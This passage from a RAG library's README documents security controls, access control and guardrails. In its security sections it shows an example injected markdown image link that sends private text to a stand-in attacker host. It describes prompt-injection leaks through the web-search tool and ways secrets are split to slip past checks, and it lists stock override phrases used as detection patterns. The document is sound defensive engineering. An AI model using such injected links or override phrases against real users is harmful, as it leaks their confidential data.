  - `usage: Dict` — `prompt_tokens` / `completion_tokens` of the answer call (`generation_usage_estimated` says whether they are the provider's counts or estimates), plus `llm_calls`, `total_prompt_tokens`, `total_completion_tokens`, `total_tokens` over every LLM call of the query (grading, routing, rewriting, ...), `usage_estimated`, and `latency_ms`
  - `metadata: Dict` — pipeline name, standalone search query, session id, strategy details, and `degraded` (a list of `{component, error}` for optional steps that failed and fell back; with `RAG(strict=True)` those failures are raised instead)
- **GraphRAG**: `raglib.graphrag.Entity`, `Relation`, `Community`

---

## Seeing the Graph

Both graph features can be opened as an interactive page: a force-directed layout with pan, zoom and drag. Click a node to see its description and connections, search by name, and colour by type or by community. The HTML file is self-contained (no CDN, no network), so graph content never leaves your machine.

```python
rag = RAG("papers/", rag_type="graph", llm="openrouter")
rag.visualize_graph("graph.html")          # entities sized by number of relations

graph = GraphContextWindow()
graph.add_documents(docs)
graph.to_html("context_graph.html")        # documents -> sections -> chunks + chat turns
```

```bash
raglib graph papers/ --out graph.html
```

## Security & Privacy

| Area | What raglib does | What you should do |
| :--- | :--- | :--- |
| API keys | Read from env vars or arguments only, never logged. A chat key is only reused for embeddings from the same provider. | Keep keys in env vars or a secret manager. `.env.example` lists every variable. |
| What leaves your machine | Questions, retrieved chunks and (with memory) chat history go to the LLM provider you chose. Chunks go to the embedding provider. Web search is off unless configured. | Use a local model (Ollama / LM Studio / vLLM) for confidential data. |
| Logs | Questions, answers and document text are never logged at INFO or above. | Don't enable DEBUG logging in production if queries may contain personal data. |
| User-supplied URLs | Private, loopback, link-local and metadata addresses are blocked (SSRF). The host is resolved once and the connection goes to the checked address, so DNS rebinding cannot reach internal services. Redirects are re-checked and responses are capped at 20 MB. With an `HTTPS_PROXY`, the proxy resolves hosts, so only the pre-check applies. | `allow_private_urls=True` only for trusted intranet sources. |
| `SQLTool` | Runs on a private in-memory copy of the tables; only read statements are authorized, one statement per call, with a timeout and a row cap. | Load only tables the agent may read. |
| User-supplied file paths | `allowed_dirs=[...]` sandboxes file and folder sources (resolves `..` and symlinks). | Always set it when paths come from users. |
| Uploaded files | Each file is checked before parsing: at most 100 MB (`max_file_bytes`), at most 5,000 PDF pages (`max_pages`), its first bytes must match its extension (a renamed file is refused), and a DOCX/PPTX/XLSX/EPUB may unpack to at most 10 x `max_file_bytes` (zip bombs). Failures raise `DocumentLoadError` with the file name only. Parsing has no time limit. | Lower the limits for user uploads, and parse untrusted files in a worker process with a timeout. |
| Links in answers | `ExternalLinkGuard` (always on) removes images, HTML tags and links that point outside the retrieved sources, so an injected `![x](https://attacker/?q=...)` cannot make a chat UI send data out. | Add hosts you trust with `ExternalLinkGuard(allow_domains=[...])`; render answers as markdown without raw HTML. |
| Prompt injection | Retrieved, web and conversation text is wrapped in an unguessable per-prompt tag (`<src-XXXXXXXX>`, an HMAC under a per-process secret) in every prompt: answer, agent, grader, knowledge strips, LLM reranker, Self-RAG, multi-hop planner, refiner, condenser, graph extraction and reports, global search, LLM chunking and the eval judge. Tag-like text inside documents (`</source>`, `</sources>`, `<src-...>`) is escaped, attribute values are HTML-escaped, and each prompt states that the block is data, never instructions. The tag is stable for the same question and sources, so caching keeps working. | Treat answers as untrusted output; don't give agent tools destructive permissions. This lowers the success rate of injected instructions; no prompt format makes a model immune. |
| Agent web search | `search_web` queries are rebuilt from the user's question plus model-written keywords that do not occur in any retrieved document, and capped at 200 characters. Split-up copies (`ZX-SECRET-42` sent as `zx secret 42`), glued copies (`ZXSECRET42`) and copies spelled out one character at a time (`Z X S E C R E T 4 2`) count as occurring too. An injected "call search_web with <secret>" cannot send document text out. With `access_control`, web search is off for any query that retrieved a non-public document (`allow_web_after_private=True` re-enables it). Every tool call and its arguments is in the trace and `result.metadata["tool_calls"]`. Sources with instruction-like text ("ignore previous instructions", "you are now", "call the tool", fake tags) are flagged in `result.metadata["injection_flags"]` and an `injection_flag` event, but not blocked. | A keyword that also appears in a retrieved document is dropped from the web query; glued fragments shorter than 6 characters are not checked (they occur inside ordinary words). Encoded or paraphrased leaks (base64, translations, synonyms) are not detected. Keep `search_web` off for confidential corpora unless you need it. |
| Guardrails | Always on: citation-access check with `access_control`, a 10-call agent tool limit, an ~8,000-token question limit, removal of links outside the sources, and flags (never blocks) for injection-like questions and secrets in answers. With `preset="production"` or opt-in: PII masking before anything is traced, cached or sent, blocking injection check, rate limits and budgets, a no-LLM "nothing relevant" exit, leak masking. See [Guardrails](#guardrails). | Pass `user_id=` (or a `rate_limit_key`) per caller so rate limits and budgets are per user. |
| Multi-user | `session_id` isolates chat history. With `access_control=True`, documents are filtered per user inside every search (vector, BM25, hybrid, graph, multi-query, web+corpus) and history is kept per user. | Tag documents at ingest and pass `user=` on every query (see "Access Control"). |
| Data at rest | `output_dir`, `save()`, Chroma and graph files contain document text and Q&A. | Store them on encrypted disks; delete with `rag.delete(source)` (removes chunks, vectors and graph entities). |

If a key was ever committed to git, rotating it is the only fix: deleting the line does not remove it from history.

To report a vulnerability, see [SECURITY.md](SECURITY.md) (GitHub private vulnerability reporting).

## Access Control

Per-document permissions, enforced inside every search (in-memory, Chroma, Qdrant, pgvector, BM25, GraphRAG, multi-query, web+corpus) before anything reaches the LLM. Deny by default: an untagged document is never returned, and a query without a user only sees the lowest level.

```python
from raglib import RAG, UserContext, access_tags

rag = RAG(llm="openai", access_control=True)   # levels: public < internal < confidential < executive

rag.add("handbook/", access=access_tags("internal"))
rag.add("board/q4_strategy.pdf", access=access_tags("executive", department="leadership", allowed_roles=["exec"]))

employee = UserContext(user_id="u42", roles=["staff"], departments=["sales"], max_access_level="internal")
rag.query("What is our Q4 strategy?", user=employee)        # never sees the board memo
rag.query("Holiday policy?", user={"max_access_level": "internal"})   # a dict works too
rag.query("Holiday policy?")                                # anonymous: "public" documents only
```

- **Tags**: `access_level` (one of the ordered levels; the user's `max_access_level` must be at or above it), `department` (the user must be in one of them, if set), `allowed_roles` (the user must hold one of them, if set). Pass them with `add(..., access=...)` or in a `Document`'s metadata.
- **Your own policy**: `AccessControl(levels=("public", "staff", "restricted"), default_access_level="staff")` changes the levels; `default_access_level` tags untagged documents instead of hiding them.
- **Your own filters** are ANDed with the permission filter, so they can only narrow it. `rag.permission_filter(user)` shows the filter raglib applies.
- **Permission changes**: re-adding unchanged text with new tags updates its permissions (no re-embedding with the default embedding cache).
- **GraphRAG**: an entity or relation is used only when one of its source chunks is visible to the user. Its merged description is shown only when all of them are, and a community report only when every member is. Each community report records the chunks it was built from, and every graph summary raglib returns (entities, relations, community reports, global-search points) inherits the strictest access tags of its source chunks: the highest `access_level`, and the intersection of `department` / `allowed_roles`. A report built from three public chunks and one confidential chunk is therefore confidential, and `CitationAccessGuard` checks a cited summary the same way retrieval does: it is visible when the user may read every one of its source chunks (`summary_rule="all_sources"`, the default). A user in both finance and legal can see a summary that mixes the two. The inherited tags are deliberately strict: the intersection of finance and legal is empty, so a tags-only check would refuse that user. `summary_rule="strict_tags"` uses the tags alone, with no chunk lookups.
- **Conversation memory** is kept per user and per current permissions: the same `session_id` used by two users never shares history, and a user whose access is lowered starts a new history.
- **Web results** from a public provider are tagged with the lowest access level (`source_type="web"`), so answers may cite them. Set `internal = True` on a search provider for an intranet or private wiki: its results are filtered at retrieval by the access tags the provider sets in their metadata (`access_level`, `department`, `allowed_roles`), and a result without tags is hidden from users without access.
- **Backends that cannot filter raise `FilterNotSupportedError`** instead of returning everything: a `BaseVectorStore` with `supports_metadata_filters = False`, a custom graph retriever without `supports_filters = True`, or a search provider that searches your corpus without filter support. Hits that a vector store returns outside the filter are dropped and logged.
- Index-time work (entity extraction, community reports) reads every document, as embedding does. Use a model you trust with all of your data for `graph_llm`.

## Guardrails

Layered checks on the question, the retrieved documents, the answer and the agent's tool calls. They run cheapest first and stop at the first block. Each guard returns **allow**, **block** (with a message for the user) or **modify** (e.g. the question with PII masked), plus a confidence. Tier 0 rules need no model and cost nothing (microseconds per check); tier 1 guards use a small model, local or API, and are opt-in (see below).

```python
from raglib import RAG
from raglib.guards import (
    PIIMasker, MaxQuestionTokens, InjectionHeuristic, UserRateLimit, UserDailyBudget,
    NothingRelevant, OutputLeakGuard, CitationAccessGuard, JSONSchemaGuard, MaxOutputTokens, ToolPolicy,
)

rag = RAG(
    "docs/", llm="openai", prices=my_prices,
    input_guards=[PIIMasker(), MaxQuestionTokens(500), InjectionHeuristic(),
                  UserRateLimit(30, per_seconds=60), UserDailyBudget(max_usd=0.50)],
    retrieval_guards=[NothingRelevant(message="That isn't covered by our documents.")],
    output_guards=[OutputLeakGuard(), CitationAccessGuard()],
)
result = rag.query("My card 4111 1111 1111 1111 was charged twice, why?", user_id="u1")
# The model saw "My card <CARD_1> was charged twice, why?"; result.answer has the real number again.
result.metadata["guards"]      # one record per decision: guard, stage, action, reason, confidence, mode, latency_ms
result.metadata["blocked_by"]  # set when a guard blocked the query
```

`preset="production"` turns on `"default"` for every stage: `PIIMasker` + `MaxQuestionTokens` + `InjectionHeuristic`, `NothingRelevant`, `OutputLeakGuard` + `CitationAccessGuard`, and a `ToolPolicy` with call and argument limits. You can also mix names and objects: `input_guards=["default", UserRateLimit(10)]`.

**Secure by default.** Every `RAG(...)`, presets or not, gets these protections. None of them changes the answer to a normal question:

| Protection | What it does | Turn it off |
| :--- | :--- | :--- |
| Source delimiters and escaping in every prompt; the agent's web-search argument guard | Always applied (see [Security & Privacy](#security--privacy)). | Not switchable. |
| `CitationAccessGuard` (when `access_control=True`) | Withholds an answer that cites a document the user may not read. With working retrieval filters this never happens; it catches a custom retriever, tool or cache that slips. | `secure_defaults={"citation_access": False}` |
| Agent tool limit: `ToolPolicy(max_tool_calls=10)` | Stops a looping agent. The default `max_steps=4` stays far below it. | `secure_defaults={"tool_limit": False}`, or pass your own `tool_policy=` |
| Injection flags: `InjectionHeuristic(flag_only=True)` | Reports injection-like questions in `result.guard_flags` and a `guard_flag` event on `on_event`. Never blocks. | `secure_defaults={"injection_flags": False}` |
| Secret flags: `OutputLeakGuard(check_pii=False, flag_only=True)` | Reports API keys, tokens and private keys in the answer, the same way. Never masks, and never looks at PII. | `secure_defaults={"secret_flags": False}` |
| External links: `ExternalLinkGuard()` | Removes images, HTML tags and links in the answer that point anywhere the retrieved sources did not. A prompt injection in a document could otherwise make the answer carry `![x](https://attacker/?q=<private text>)`, which a chat UI fetches on display. Links to the sources are kept. This is the one default that changes such answers; answers without outside links are unchanged and leave no record. Streams stay word by word. | `secure_defaults={"external_links": False}`, or `output_guards=[ExternalLinkGuard(allow_domains=["docs.example.com"])]` to trust more hosts |

`secure_defaults=False` turns all four off. A guard of the same class that you configure yourself (e.g. a blocking `InjectionHeuristic()` in `input_guards`) replaces the default one. Flag-only guards are quiet: they add no trace stage, and they add nothing to the result unless they find something. Flag-only output guards run once on the finished answer, so `rag.stream(...)` still yields every model token as it arrives, and their flags are on the final result. With `access_control=True`, the always-on `CitationAccessGuard` has to see whole `[n]` markers, so the stream trails the model by about one word (8 characters), not one token. Any guard can run this way: `OutputLeakGuard(flag_only=True)`.

When a `RAG(...)` is created without `preset="production"` and without any guards of your own, raglib logs one INFO line per process pointing here. Set `RAGLIB_GUARD_TIP=0` to hide it.

| Guard | Stage | What it does | Cost / trade-off |
| :--- | :--- | :--- | :--- |
| `PIIMasker(phone=False, restore=True)` | input | Replaces e-mails, card numbers (Luhn checksum), Aadhaar (Verhoeff checksum) and PAN numbers (strict format) with typed placeholders (`<EMAIL_1>`, `<CARD_1>`, ...). It runs before every other guard, so the raw values never reach traces, `on_event`, `LatencyStats`, caches, memory or any model. With `restore=True`, the values are put back into the final answer for the caller (see below). Phone numbers are opt-in (`phone=True`). `action="block"` refuses instead. | Free. Regexes miss names, addresses and unusual formats. A masked question can retrieve worse when the PII was the search key. |
| `MaxQuestionTokens(1000)` | input | Blocks over-long questions. | Free. Caps prompt cost per query. |
| `UserRateLimit(30, per_seconds=60)` | input | Sliding window per caller (see "Who is the caller" below). | Free. The default store is per process: each worker counts on its own. For a global limit, pass a shared `GuardStore` or use your API gateway. |
| `UserDailyBudget(max_usd=1.0)` | input | Blocks a user whose spend today (UTC) reached the budget. Spend is each answer's `usage["cost_usd"]`, the pricing `CostReport` uses. | Free. Needs `prices=`; without them it is skipped with a one-time `GuardSkippedWarning`. Charged after the query, so the last query of a day can overshoot by its own cost. |
| `InjectionHeuristic()` | input | Keyword patterns ("ignore previous instructions", fake tags, "reveal the system prompt"). Strong or repeated signals block (confidence 0.9). One weak signal is allowed and recorded with low confidence. | Free. Catches copy-paste attacks, not paraphrased or encoded ones. |
| `NothingRelevant()` | retrieval | When the best retrieved chunk is below the threshold, answers "I couldn't find this in the documents." **without calling the LLM**. | Free, and it saves the answer LLM call for off-topic questions. A threshold set too high refuses answerable questions. |
| `OutputLeakGuard()` | output | Masks API keys, cloud keys, private keys and JWTs in the answer. It also masks personal data that is *not* in the sources the user could read (a support e-mail from your docs is kept). Phone numbers with `phone=True`. | Free. Same regex limits as `PIIMasker`. |
| `CitationAccessGuard()` | output | With access control, withholds an answer that cites a document the user cannot read (defense in depth), and strips `[n]` markers that point past the source list. | Free. |
| `JSONSchemaGuard(schema)` | output | The answer must be JSON matching `schema` (a code fence is unwrapped). Uses `jsonschema` when it is installed, otherwise a built-in subset (`type`, `required`, `properties`, `items`, `enum`). | Free. It blocks; it does not re-ask the model. |
| `MaxOutputTokens(800)` | output | Truncates (or with `action="block"`, withholds) long answers. While streaming, the truncating version also stops reading the model's stream. | Free. On `query` it limits what is shown, not what you pay: the tokens were already generated. `llm_max_tokens` (4096 in `preset="production"`) is what caps cost, because the model stops there. |
| `ToolPolicy(...)` | agent | `allowed_tools={"support": ["search_docs"]}` (the union over the user's roles; `default_tools` applies to everyone else), `max_tool_calls=8` per question, `max_argument_chars=1000`, and `argument_checks={"sql": fn}`. A blocked call is sent back to the agent as the tool's answer. | Free. A tool the user may not call is never offered to the model. |

**PII look-alikes.** Every number pattern is bounded on both sides, so it never matches inside a longer word or number, a decimal, version or price (`1.2.3`, `4,111.50`), a path or an id (`ORD-4111111111111111`). Card numbers must pass Luhn and use one kind of separator. Aadhaar numbers must pass Verhoeff (a random 12-digit invoice number fails about 90% of the time) and use consistent separators. PAN numbers must be upper case with a valid holder-type letter (`AAAPA9999A`). Phone numbers are off by default, because order ids, invoice numbers and dates look too much like them.

**Restoring PII for the caller.** The placeholder map is created for one request and lives only in that call. It is never traced, logged or cached, and it never appears in `result.metadata`. The answer returned by `query` / `stream` has the real values back. Everything stored keeps the placeholders: the LLM and answer caches, conversation memory, `output_dir` files and trace events. While streaming, a placeholder cut across tokens (`<EMA` + `IL_1>`) is held back until it is complete. Placeholders are numbered per request, so in a multi-turn chat `<EMAIL_1>` in an earlier turn may stand for a different value. `PIIMasker(restore=False)` keeps the placeholders in the answer too.

**Who is the caller (rate limits and budgets).** The caller is `RAG(rate_limit_key=fn)` when given: `fn(context)` returns a key from `context.user_id`, `context.session_id` or `context.request`, never from the question. Otherwise it is the user id, from `query(..., user_id="u42")` (no access control needed) or `UserContext.user_id`. Pass request data with `query(..., request={"ip": ip, "api_key_id": key_id, "tenant": tenant})`. A guard's own `key=fn` overrides both. A request without a key follows the guard's `anonymous_policy`: `"skip"` (default: not limited, recorded as `mode="skipped"`), `"shared"` (one bucket for all anonymous requests) or `"block"` ("Please sign in"). A `session_id` alone is not an identity, because the client chooses it. Counters live in a `GuardStore`. The default `InMemoryGuardStore` is per process and resets on restart. Implement `hit` / `spent` / `add_spend` on a shared backend and pass it as `RAG(guard_store=...)` (or per guard, `store=`) for limits across workers.

```python
rag = RAG("docs/", llm="openai", prices=my_prices,
          input_guards=[UserRateLimit(20, per_seconds=60, anonymous_policy="shared"), UserDailyBudget(max_usd=0.50)],
          rate_limit_key=lambda c: c.request.get("api_key_id") or c.user_id)
rag.query("Holiday policy?", request={"api_key_id": "key_8f2"})
```

**Nothing-relevant thresholds.** With `score="auto"`, the guard uses the reranker score when a Cohere or cross-encoder reranker ran, otherwise the dense cosine similarity of the query and the chunk. The defaults are deliberately low, so only clearly unrelated questions stop: cosine `0.15`, Cohere relevance `0.02`, cross-encoder logit `-7`. BM25-only, fusion-only, web and tool results have no absolute scale, so the check is skipped for them, and so is offline `MockEmbedding`. Embedding models differ (e5 models score unrelated text around 0.7), so check `result.sources[i].metadata["dense_score"]` / `["rerank_score"]` on your own data and set `NothingRelevant(threshold=0.3)` or `threshold={"dense": 0.3, "cross_encoder": -4}`. No documents at all also exits early, except for small talk and "no retrieval needed" decisions.

**Failure policy.** A guard that raises **fails closed** (blocks) when it is a security guard and **fails open** (allows, `error` recorded) when it is a quality guard (`NothingRelevant`, `MaxOutputTokens`, `JSONSchemaGuard`). Override it per guard with `fail_closed=True/False`. Every guard also takes `message=` for its user-facing text.

**Caching.** Decisions of deterministic guards (`MaxQuestionTokens`, `InjectionHeuristic`) are cached by a hash of the input for `guard_cache_ttl` seconds (default 1 h, `None` turns it off). Stateful guards (rate limit, budget) are never cached, and neither are errors. A guard's refusal is never stored in the answer cache, so a document added later can answer the question. The answer-cache key includes a hash of the active guard configuration (every guard's class and settings), so adding, removing or changing a guard never serves an answer cached under the old guards.

**Nothing unmasked in errors, logs or traces.** The runner removes the checked text from every guard message, reason and error, and masks PII and secrets in them, before they are traced, logged or returned. That covers a custom guard that raises `ValueError(f"bad {question}")`. The retrieval exit's internal `GuardBlockedError` carries only the guard's user-facing message. Logs run after masking, and no log line contains the question.

**Observability.** Each guard is its own trace stage `guard.<name>`, with `stage`, `tier`, `action`, `mode` (`rule` / `local` / `api` / `skipped`), `confidence`, `cached` and `reason` in its meta. Guard stages show up in `result.trace_events`, `on_event`, `LatencyStats` (listed first) and `CostReport` (each guard on its own line, tier 0 at $0). The `total` event carries a `blocked_by` tag, so `LatencyStats` samples can be split by it. A blocked question makes no retrieval and no LLM call (`usage["llm_calls"] == 0`).

**Streaming.** Output guards declare `streaming_safe`. When every output guard is streaming-safe (`OutputLeakGuard` masking, `CitationAccessGuard`, truncating `MaxOutputTokens`, which covers the production preset), `rag.stream(...)` keeps streaming. A piece is checked and shown when its sentence ends, or, for a long sentence, once it is `stream_holdback_chars` characters behind the model (default 64). The minimum is 40, because the longest text that can still turn into a secret while containing a space is a PEM header (`-----BEGIN ENCRYPTED PRIVATE KEY-----`, 37 characters); a card number with separators is at most 23. A smaller window would let part of a header or card number out before the pattern can match. A larger one makes long sentences appear in bigger chunks. The release point never cuts through a key, a card number, a `[n]` citation or a placeholder, so a secret split across tokens is still caught whole. A block mid-stream cannot take back pieces already shown: the stream stops and the guard's message is appended. A guard that is not streaming-safe (`JSONSchemaGuard`, blocking variants, the grounding check planned for later) makes the answer arrive in one piece after it is checked. The trade-off: the text lags the model by up to one sentence.

**Custom guards.** Subclass `raglib.guards.Guard`, set `name`, `stages` (`("input",)`, `("retrieval",)`, `("output",)`), `tier`, `kind` (`"security"` or `"quality"`) and `cacheable`, and return `allow()`, `block(message)` or `modify(value)` from `check(value, context)`. `context` has the question, `user`, `user_id`, `user_key`, `session_id`, `request`, `filters`, `permission_filter` and `documents`. For output guards, set `streaming_safe = True` when `check` works on a piece of the answer (state across pieces goes in `check_stream(chunk, context, state)`).

### Tier 1: cheap model checks (opt-in)

Tier 1 guards use a small model. They are opt-in and never required: each one picks its model in this order, and records the choice as `mode` on every decision and on its trace stage.

1. **local**: a local model you configured, with `local_model=` on the guard or `RAG(guard_models={"injection": ..., "toxicity": ..., "nli": ...})`. It can be a callable (your own scorer) or a Hugging Face model id that is already downloaded. raglib loads model ids with `local_files_only=True` and **never downloads a model** unless you pass `allow_download=True`.
2. **api**: your already-configured models. Toxicity uses OpenAI's free moderation endpoint when your chat provider is OpenAI; everything else uses the cheapest configured chat model (`cheap_llm`, then `graph_llm`, then the main model; with `prices=`, the lowest input price wins). `api=False` turns this step off.
3. **skipped**: the guard allows the question and records `mode="skipped"`. A one-time `GuardSkippedWarning` says what was skipped, which local model to install and which setting enables it.

```python
from raglib.guards import TopicGuard, InjectionClassifier, ToxicityClassifier, GroundingGuard

rag = RAG(
    "docs/", llm="openai/gpt-4.1-mini", cheap_llm="openai/gpt-4.1-nano",
    input_guards=["default",
                  TopicGuard({"billing": ["How do I pay an invoice?"], "shipping": ["Where is my parcel?"]}),
                  InjectionClassifier(),                     # local if configured, else gpt-4.1-nano
                  ToxicityClassifier()],                     # OpenAI moderation (free)
    output_guards=["default", GroundingGuard(grounding_sample_rate=0.05)],
    # Optional and recommended: local models cost nothing per question and answer in milliseconds.
    # pip install raglib-py[guards] && huggingface-cli download protectai/deberta-v3-base-prompt-injection-v2
    guard_models={"injection": "protectai/deberta-v3-base-prompt-injection-v2"},
)
```

| Guard | What it checks | Recommended local model (optional) | Local: cost / latency | API alternative | API: cost / latency |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `TopicGuard(topics, threshold=0.35)` | The question is close to one of your example questions (cosine of the query embedding) | none: reuses the query embedding | $0, under 1 ms (examples embedded once) | none needed | $0 extra: retrieval's own `embed_query` call, served from the embedding cache |
| `InjectionClassifier(threshold=0.5)` | Prompt-injection attempts | `protectai/deberta-v3-base-prompt-injection-v2` (184M) | $0, ~20-60 ms CPU / ~5 ms GPU | cheapest chat model, one JSON call | ~$0.00002-0.0001 per question, ~0.3-1 s (in parallel with retrieval) |
| `ToxicityClassifier(threshold=0.7)` | Abuse, hate, threats; `check_answers=True` also checks answers | `unitary/toxic-bert` (110M) | $0, ~15-40 ms CPU | OpenAI moderation (`omni-moderation-latest`, free) when the chat provider is OpenAI, else the cheapest chat model | $0 / ~$0.00002, ~0.1-1 s |
| `GroundingGuard(min_supported=0.5)` | Share of answer sentences supported by the sources | `cross-encoder/nli-deberta-v3-small` (140M), on every answer | $0, ~20-40 ms per sentence-source pair (~0.1-0.5 s per answer) | cheapest chat model as a judge, on `grounding_sample_rate` of answers (default 5%) | ~$0.0002-0.001 per checked answer (the sources are in the prompt), ~0.5-1.5 s; ~$0.00001-0.00005 per answer on average at 5% |

These figures are rough: they depend on hardware, text length and your model prices. Measure your own with `LatencyStats` (each guard is its own stage) and `CostReport` (each guard on its own line).

**Parallel with retrieval.** Tier 1 input classifiers (`InjectionClassifier`, `ToxicityClassifier`, or any guard with `tier >= 1` and `parallel = True`) start in worker threads while retrieval runs:
- Every LLM call waits for them first: generation, and also the agent's planner, the query rewriter and the router. `RAG` puts one gate (`GatedLLMClient`) in front of every model it uses, so this holds for any client, including your own `BaseLLMClient` and LangChain models, with or without `llm_cache`. A blocked question therefore never reaches a model, and a stream emits no token before the guards have decided.
- Each stream runs in its own context, so iterating it from a web framework that gives every `next()` a fresh context (Starlette's `iterate_in_threadpool`), or interleaving it with other queries, keeps its guards, flags, usage and budget to itself.
- When a guard blocks, the next pipeline stage to start (a vector search, the reranker, a tool call) is cancelled instead of running. The result carries `blocked_by` and a `retrieval_cancelled` tag on the trace.
- The trade-off: retrieval work that had already started (embedding the query, a vector search) is paid for even when the question is then blocked. A model call never is.
- `TopicGuard` runs first, not in parallel, because its embedding call is the one retrieval then reuses.

**Hardened guard prompts.** Every API-based guard call uses the same protection as the main prompts. The checked text sits inside the per-prompt delimiter, with tag-like text escaped. The prompt says that text inside is data, never instructions, including notes addressed to "the safety checker". The reply must be exactly one JSON object of a fixed shape. A reply that does not parse, or has the wrong keys, types or ranges, counts as **unsure** and is never read as "safe": security guards (injection, toxicity) fail closed, and the grounding check fails open.

**Grounding.** `GroundingGuard` is not streaming-safe, so with it `rag.stream(...)` delivers the checked answer in one piece. In API mode, answers that were not sampled are recorded as `mode="skipped"` with reason "not sampled". Sampling measures your grounding rate; it does not police every answer. To check every answer, use a local NLI model, which is free per answer, or set `grounding_sample_rate=1.0`. Small NLI models can misjudge paraphrases and numbers, so calibrate `min_supported` / `entailment_threshold` on your own answers first.

### Tier 2: the LLM judge (used sparingly)

Tier 1 guards (`InjectionClassifier`, `ToxicityClassifier`, `GroundingGuard`) escalate to an LLM judge only when they need to:
- Their confidence is below `escalate_below` (per guard; default 0.6, and `None` never escalates on confidence), or their verdict was unsure because the output did not parse.
- The request is high-risk: a question for an agent with tools (`rag_type="agentic"`), or an answer that used non-public documents.
- `GroundingGuard` without a local NLI model is judged on `grounding_sample_rate` of normal answers (default 5%), plus **every** answer that used non-public documents.

There are two judgments. `input_safety` checks injection and toxicity in one call; both classifiers share it, and the second one reads it from the cache. `grounding` checks whether the answer is supported. Both judge prompts are hardened like every other guard prompt. A judge reply that does not parse is unsure: input safety fails closed and grounding fails open.

```python
from raglib.guards import InjectionClassifier, GroundingGuard, JudgeBudget

rag = RAG(
    "docs/", llm="openai/gpt-4.1",
    input_guards=["default", InjectionClassifier(local_model="protectai/deberta-v3-base-prompt-injection-v2", escalate_below=0.7)],
    output_guards=["default", GroundingGuard(grounding_sample_rate=0.05)],
    judge_model="openai/gpt-4.1-mini",                 # default: your cheapest configured chat model
    judge_budget=JudgeBudget(max_calls_per_minute=30, max_usd_per_day=2.0),
)
```

| Option | Effect | Trade-off |
| :--- | :--- | :--- |
| `escalate_below` (per guard) | Below this confidence, ask the judge | Higher means more judge calls (cost, ~0.3-1.5 s each) and fewer wrong tier-1 verdicts |
| `use_judge=False` (per guard) | This guard never escalates | Tier 1 stands, including unsure verdicts (which fail closed for security guards) |
| `judge_model=` | The model that judges | A stronger judge is more accurate per call; at most a few percent of questions reach it |
| `judge_budget=` | Caps judge calls or cost per minute / UTC day, per process | Once it is reached, the tier-1 verdict stands; the judge stage has `budget_exhausted=True` and the decision has `judge="budget"`. USD caps need `prices=`. The last admitted call can overshoot by its own cost. |
| `grounding_sample_rate` | Share of normal answers whose grounding is judged | 5% measures your grounding rate. It does not check every answer; use a local NLI model for that. |

Judge verdicts are cached by input hash plus the judge's configuration (model and prompt version), for `guard_cache_ttl` seconds. They are never cached for user-dependent checks, i.e. grounding over non-public documents. Every judge call is its own trace stage, `judge.input_safety` or `judge.grounding`, with `escalated=True`, `escalation` (the reason), `model`, `cached` and `budget_exhausted` in its meta. That makes it a separate `LatencyStats` stage and a separate `CostReport` line. The deciding guard's record in `result.metadata["guards"]` has `tier=2`, `escalated` and `judge` (`ok` / `cached` / `budget` / `unsure`).


## Scaling & Concurrency

- **Many users at once:** one `RAG` instance is thread-safe. Queries run in parallel (read lock) while `add` / `delete` take a short write lock. Embedding calls happen outside the lock. Give every chat window its own `session_id`. Tested with 16 concurrent sessions plus a writer thread: 0 errors, 0 history leaks. Caches, rate limits and invalidation are per process (see "Caching").
- **Large collections:** `rag.add("folder/", batch_size=256, on_progress=print)` streams files in batches, embeds up to 4 batches concurrently, and keeps everything indexed so far if a run fails. Re-running resumes, skipping unchanged documents.
- **Memory:** the in-memory store keeps float32 vectors (about 1 GB of RAM per 30,000 chunks of 1536-dim embeddings including the keyword index and text). Above roughly 100,000 chunks use `vector_db="chroma"` with a persist directory or server, or another dedicated vector database.
- **GraphRAG cost:** one LLM call per chunk at ingestion (parallel, cached), so for very large corpora start with `rag_type="advanced"` and enable the graph for the subset that needs relationship questions.

## 16. Migrating from v1 to v2

| v1 behaviour | v2 behaviour | What to do |
| :--- | :--- | :--- |
| No key → silent `MockLLMClient` answers | Raises `ValueError` | Pass `chat_llm=...`, or `offline=True` for tests |
| Anthropic/Groq chat → silent hash embeddings | Uses provider / HuggingFace embeddings, else BM25 with a warning | Set `embedding_llm` explicitly |
| Default `rag_type="corrective"` with DuckDuckGo | Default `"advanced"`, web search off | Set `web_search_provider` to use the web |
| `"hybrid"` = vector + web | `"hybrid"` = BM25 + vector; `"hybrid_web"` = corpus + web | Use `rag_type="hybrid_web"` for the old behaviour |
| Lexical `Reranker` re-scored everything | `reranker="none"` keeps retrieval order | Use `reranker="cross_encoder"` for real reranking |
| Shared Chroma collection `"raglib"` | Unique collection per instance | Pass `collection_name` + `persist_directory` to reuse an index |
| Chroma errors fell back to memory silently | Errors are raised | `vector_db_kwargs={"fallback_to_memory": True}` to opt in |
| `rag.add()` duplicated content | Idempotent upsert; `update()` / `delete()` added | – |
| One global chat memory | Per-`session_id` memory with token cap and question condensation | Pass `session_id` per user |
| Chunk ids `{doc}_chunk_{n}` | `{doc}_chunk_{n}_{hash}` | Re-index persisted Chroma collections |
| Core install pulled every SDK + torch | Core has no dependencies; use extras | `pip install "raglib-py[openai,chroma]"` etc. |
| `raglib.preprocessing`, `raglib.config`, `raglib.main`, duplicate loaders | Removed (preprocessing kept as deprecated shim) | Import `ChunkSplitter` from `raglib` |
